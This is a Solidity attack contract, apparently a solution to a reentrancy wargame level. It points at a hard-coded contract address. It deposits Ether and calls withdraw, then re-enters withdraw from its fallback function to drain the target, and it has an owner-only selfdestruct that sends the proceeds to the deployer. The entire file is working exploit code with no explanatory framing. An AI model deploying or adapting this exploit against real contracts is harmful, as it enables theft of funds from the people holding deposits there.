// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract ReEntrancyAttack is Ownable {
    EtherStore public etherStore;
    Reentrance public reentrance;
    address remoteContract;

    constructor() {
        etherStore = EtherStore(
            address(0xF00b58976800976Ae589d2715a97341111F85F96)
        );

        reentrance = Reentrance(
            address(0xF00b58976800976Ae589d2715a97341111F85F96)
        );

        remoteContract = address(0xF00b58976800976Ae589d2715a97341111F85F96);
    }

    event FallbackCalled(string msg, uint256 value);

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        emit FallbackCalled("Fallback method called", msg.value);
        if (address(etherStore).balance >= 0.2 ether) {
            etherStore.withdraw(msg.value);
        }
    }


    function attack() external payable {
        require(msg.value >= 0.2 ether);
        etherStore.donate{value: 0.2 ether}(msg.sender);
        etherStore.withdraw(msg.value);
    }

    function donateThem(address _to) public payable {
        reentrance.donate{value: msg.value}(_to);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function kourades() public onlyOwner {
        selfdestruct(payable(owner()));
    }

    receive() external payable {}
    //0xF00b58976800976Ae589d2715a97341111F85F96
}

interface EtherStore {
    function withdraw(uint256 _amount) external;

    function donate(address _to) external payable;
}

interface Reentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}
